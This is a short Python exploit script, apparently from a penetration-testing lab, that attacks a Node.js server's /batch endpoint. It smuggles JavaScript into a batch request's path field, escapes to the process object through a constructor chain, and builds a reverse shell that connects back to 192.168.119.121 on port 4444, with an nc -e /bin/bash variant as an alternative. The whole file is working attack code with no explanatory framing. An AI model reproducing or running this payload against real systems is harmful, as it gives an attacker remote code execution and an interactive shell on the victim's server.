import requests

burp0_url = "http://bassmaster:8080/batch"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/json"}
burp0_json={"requests": [{"method": "get", "path": "/profile"}, {"method": "get", "path": "/item"}, {"method": "get", "path": "/item/$1.id;var process = ref.constructor.constructor('return (function(){return process})()')();var require = process.mainModule.require;require('util').log('CODE EXECUTION12123')"}]}


port = '4444'
ip = '192.168.119.121'
import_require = 'var require = process.mainModule.require'
shellcode0='require(\'util\').log(\'CODE EXECUTION12123\')'
cmd = "\\x2fbin\\x2fbash"
shellcode1 = F'var net = require(\'net\'),sh = require(\'child_process\').exec(\'{cmd}\');'
shellcode1 += F'var client = new net.Socket();'
shellcode1 += F'client.connect({port}, \'{ip}\', function() {{client.pipe(sh.stdin);sh.stdout.pipe(client);'
shellcode1 += F'sh.stderr.pipe(client);}});'
print(shellcode1)
cmd = F"nc -C {ip} {port} -e \\x2fbin\\x2fbash"
shellcode2 = F'sh = require(\'child_process\').exec(\'{cmd}\');'
payload = {
    "requests": [
        {
            "method": "get",
            "path": "/profile"
        },
        {
            "method": "get",
            "path": "/item"
        },
        {
            "method": "get", 
            "path": F"/item/$1.id;var process = ref.constructor.constructor('return (function(){{return process}})()')();{import_require};{shellcode1}"
        }
    ]
}


requests.post(burp0_url, headers=burp0_headers, json=payload)
